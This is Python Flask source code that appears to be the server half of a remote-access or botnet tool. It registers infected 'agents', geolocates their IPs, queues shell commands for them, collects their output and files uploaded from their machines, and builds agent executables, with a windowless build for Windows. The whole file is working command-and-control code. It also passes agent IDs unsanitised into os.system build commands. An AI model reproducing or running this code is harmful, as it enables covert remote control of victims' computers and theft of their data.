import json
import base64
import os
from datetime import datetime
import tempfile
import shutil

from flask import Blueprint
from flask import request
from flask import abort
from flask import current_app
from flask import url_for
from flask import send_file
from werkzeug.utils import secure_filename
import pygeoip

from webui import require_admin
from models import db
from models import Agent
from models import Command


api = Blueprint('api', __name__)
GEOIP = pygeoip.GeoIP('api/GeoIP.dat', pygeoip.MEMORY_CACHE)


def geolocation(ip):
    geoloc_str = 'Local'
    info = GEOIP.record_by_addr(ip)
    if info:
        geoloc_str = info['city'] + ' [' + info['country_code'] + ']'
    return geoloc_str


@api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmdline'])
    return ''


@api.route('/<agent_id>/hello', methods=['POST'])
def get_command(agent_id):
    # No agent_id, register the new agent
    agent = None
    if agent_id == 'anonymous':
        agent = Agent()
        db.session.add(agent)
        db.session.commit()
    else:
        agent = Agent.query.get(agent_id)
        if not agent:
            print "Creating agent"
            agent = Agent()
            agent.set_id(agent_id)
            agent.rename(agent_id)
            db.session.add(agent)
            db.session.commit()
    # Report basic info about the agent
    info = request.json
    if info:
        if 'platform' in info:
            agent.operating_system = info['platform']
        if 'cwd' in info:
            agent.set_cwd(info['cwd'])
    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.geolocation = geolocation(agent.remote_ip)
    db.session.commit()
    # Return pending commands for the agent
    cmds = {}
    for cmd in agent.commands.filter_by(executed=False).order_by(Command.timestamp.desc()):
        cmds[cmd.id] = cmd.cmdline
    # Build JSON response
    resp = {}
    resp['cmds'] = cmds
    if agent_id == 'anonymous':
        resp['set_UID'] = agent.id
    return json.dumps(resp)


@api.route('/<agent_id>/report', methods=['POST'])
def report_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    cmd_id = int(request.form['id'])
    output = request.form['output']
    cwd = request.form['cwd']
    cmd = Command.query.filter_by(id=cmd_id).first()
    if cmd and not cmd.executed:                
        cmd.output = base64.b64decode(output)
        cmd.executed = True
        agent.set_cwd(cwd)
        if cmd.waits_file:
            for output_file in request.files.values():
                relative_path = agent_id
                absolute_path = os.path.join(current_app.config['UPLOAD_FOLDER'], relative_path)
                filename = secure_filename(output_file.filename)
                if not os.path.exists(absolute_path):
                    os.makedirs(absolute_path)
                while os.path.exists(os.path.join(absolute_path, filename)):
                    filename = '_' + filename
                output_file.save(os.path.join(absolute_path, filename))
                download_link = url_for('webui.uploads', path=os.path.join(relative_path, filename))
                cmd.server_output += 'File uploaded: <a href="' + download_link + '">' + download_link + '</a>'
        db.session.add(cmd)
        db.session.commit()
    else:
        abort(404)
    return ''


def _build_agent(agent_id, platform, server_url, hello_interval, idle_time):
    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
    if os.path.exists(working_dir):
        shutil.rmtree(working_dir)
    shutil.copytree('../agent', working_dir)
    template_conf = open('../agent/template_config.py', 'r').read()
    template_conf = template_conf.replace('__UID__', agent_id)
    template_conf = template_conf.replace('__SERVER__', server_url)
    template_conf = template_conf.replace('__HELLO_INTERVAL__', str(hello_interval))
    template_conf = template_conf.replace('__IDLE_TIME__', str(idle_time))
    with open(os.path.join(working_dir, 'config.py'), 'w') as f:
        f.write(template_conf)
    if platform == 'Linux':
        cwd = os.getcwd()
        os.chdir(working_dir)
        shutil.move('agent.py', agent_id + '.py')
        os.system('pyinstaller --workpath ' + os.path.join(working_dir, 'build') + ' --distpath ' + os.path.join(working_dir, 'dist') + ' --onefile ' + agent_id + '.py')
        agent_file = os.path.join(working_dir, 'dist', agent_id)
        os.chdir(cwd)
        return agent_file
    elif platform == 'Windows':
        cwd = os.getcwd()
        os.chdir(working_dir)
        shutil.move('agent.py', agent_id + '.py')
        os.system('wine pyinstaller --noconsole --onefile ' + agent_id + '.py')
        agent_file = os.path.join(working_dir, 'dist', agent_id + '.exe')
        os.chdir(cwd)
        return agent_file
    return ''
